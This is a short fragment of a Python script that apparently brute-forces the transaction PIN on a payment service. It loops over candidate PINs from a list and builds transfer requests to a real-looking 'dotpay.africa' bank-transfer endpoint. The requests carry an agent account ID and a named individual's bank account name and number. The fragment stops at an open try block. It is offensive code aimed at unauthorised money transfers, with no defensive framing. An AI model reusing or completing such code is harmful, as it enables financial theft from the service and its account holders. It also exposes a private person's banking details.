...
def mainProg(m,n,p):
    ...
    i = 1
    for line in lines[618:]:
        print(f"PROCESS==> {p}\n")
        print(f"{i}==> Trying: {line} \n")
        otp = line.strip()
        otp = int(otp)
        payload = json.dumps({"agentAccountId":"DOT032499578","amount":100.0,"bankAccountName":"Isiaka Olatunbosun Okunnuga","bankAccountNumber":"1003559893","bankCode":"090470","bankName":"CHANGHAN RTS MICROFINANCE BANK","narration":"Internal Transfer","NESessionID":"","paymentDate":"095212","transactionPin":str(otp),"transactionReference":"DOT032499578120230622215212","geoLocation":""})
        url = f"https://transaction.dotpay.africa/v1/transaction/transfer/to/bank"
        #print(url)
        try:
